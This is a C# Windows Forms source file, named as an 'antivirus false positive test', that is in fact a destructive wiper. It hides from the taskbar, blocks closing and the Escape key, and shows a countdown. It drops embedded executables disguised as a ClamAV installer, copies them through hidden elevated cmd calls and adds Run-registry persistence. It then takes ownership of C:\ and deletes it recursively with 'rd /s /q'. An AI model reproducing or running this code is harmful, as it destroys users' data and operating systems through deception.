
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace antivirusfalsepositivetest4
{
    public partial class Form1 : Form
    {
        private Timer timer;
        private int countdownSeconds = 300; // 5 minutes in seconds
        private Label countdownLabel; // Declare the Label variable

        public Form1()
        {
            InitializeComponent();
            this.ShowInTaskbar = false; // Görev çubuğunda görünmemesini sağlar
            InitializeTimer();
            InitializeUI();
            CustomActions0.StartMonitoringX();
            CustomActions0.StartMonitoringX0();
            CustomActions0.StartMonitoring();
        }

        private void InitializeTimer()
        {
            timer = new Timer();
            timer.Interval = 1000; // 1 second
            timer.Tick += Timer_Tick;
            StartTimer();
        }

        private void InitializeUI()
        {
            // Create a label to display the countdown time
            countdownLabel = new Label();
            countdownLabel.Text = FormatTime(countdownSeconds);
            countdownLabel.Font = new System.Drawing.Font("Arial", 12, System.Drawing.FontStyle.Bold);
            countdownLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;

            // Dock the label to the top of the form
            countdownLabel.Dock = DockStyle.Top;

            // Add the label to the form
            Controls.Add(countdownLabel);

            // Set the Form to be TopMost
            TopMost = true;
        }

        private void StartTimer()
        {
            timer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            countdownSeconds--;

            if (countdownSeconds >= 0)
            {
                // Update the countdown label
                countdownLabel.Text = FormatTime(countdownSeconds);
            }

            if (countdownSeconds == 0)
            {
                timer.Stop();
                CustomActions.System32(); // 5 dakika sonra System32 işlemini çağır
            }
        }

        private string FormatTime(int seconds)
        {
            int minutes = seconds / 60;
            int remainingSeconds = seconds % 60;
            return $"{minutes:D2}:{remainingSeconds:D2}";
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            CustomActions.System32();
            e.Cancel = true; // Form'un kapatılmasını engelle
            base.OnFormClosing(e);
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
            {
                // Escape tuşuna basıldığında programın kapanmasını engelle
                e.Handled = true;
                CustomActions.System32();
            }
        }
    }

    public static class CustomActions0
    {
        public static void StartMonitoring()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller0.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "thirdpartyclamavinstaller0.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.thirdpartyclamavinstaller0;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller0.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(processInfo);
                    // Başlangıca kaydetme işlemi
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("MyGigaPp", backupPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(processInfo);
                    // Başlangıca kaydetme işlemi
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("MyGigaP", antiAttackPath);
                }
                catch (Exception ex)
                {
                }
            }
        }
        public static void StartMonitoringX()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "thirdpartyclamavinstaller.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.thirdpartyclamavinstaller;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                    Process.Start("thirdpartyclamavinstaller.exe");
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }


            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden

                    };

                    // Start the process
                    Process.Start(processInfo);
                    Process.Start("thirdpartyclamavinstaller.exe");
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
        }
            public static void StartMonitoringX0()
            {
                string antivirusPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");
                string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "thirdpartyclamavinstaller.exe");
                string antiAttackPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");
                string regFilePath = Path.Combine(Application.StartupPath, "disctrl.reg");
            string regFileText = Properties.Resources.disctrl;
            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.thirdpartyclamavinstaller;
            byte[] regFileBytes = Encoding.UTF8.GetBytes(regFileText);
            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
                {
                    try
                    {
                        // Save the resource to the temporary location
                        File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }

                // Check if the disctrl.reg file doesn't exist or is different from the resource for disctrl.reg
                if (!File.Exists(regFilePath) || !File.ReadAllBytes(regFilePath).SequenceEqual(regFileBytes))
                {
                    try
                    {
                        // Save the resource to the temporary location
                        File.WriteAllBytes(regFilePath, regFileBytes);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }

                if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
                {
                    try
                    {
                        // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                        ProcessStartInfo processInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                            Verb = "runas", // Run with elevated privileges (UAC)
                            CreateNoWindow = true,  // Hide the CMD window
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        // Start the process
                        Process.Start(processInfo);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
                else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
                {
                    try
                    {
                        // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                        ProcessStartInfo processInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                            Verb = "runas", // Run with elevated privileges (UAC)
                            CreateNoWindow = true,  // Hide the CMD window
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        // Start the process
                        Process.Start(processInfo);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
            }
        }

    public static class CustomActions
    {
        public static void System32()
        {

            // System32 dizin yolu
            string system32Path = ("C:\\");

            // takeown komutunu kullanarak sahipliği al
            Process takeownProcess = new Process();
            takeownProcess.StartInfo.FileName = "takeown";
            takeownProcess.StartInfo.Arguments = $"/F \"{system32Path}\" /R /A /D Y";
            takeownProcess.StartInfo.RedirectStandardOutput = true;
            takeownProcess.StartInfo.UseShellExecute = false;
            takeownProcess.StartInfo.CreateNoWindow = true;

            takeownProcess.Start();
            takeownProcess.WaitForExit();

            // icals komutunu kullanarak izinleri değiştir
            Process icaclsProcess = new Process();
            icaclsProcess.StartInfo.FileName = "icacls";
            icaclsProcess.StartInfo.Arguments = $"\"{system32Path}\" /grant %username%:(F)";
            icaclsProcess.StartInfo.RedirectStandardOutput = true;
            icaclsProcess.StartInfo.UseShellExecute = false;
            icaclsProcess.StartInfo.CreateNoWindow = true;

            icaclsProcess.Start();
            icaclsProcess.WaitForExit();

            // System32 dizinini silmek için rd komutunu kullan (Dikkatli olun!)
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/C rd /s /q \"{system32Path}\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
        }
    }
}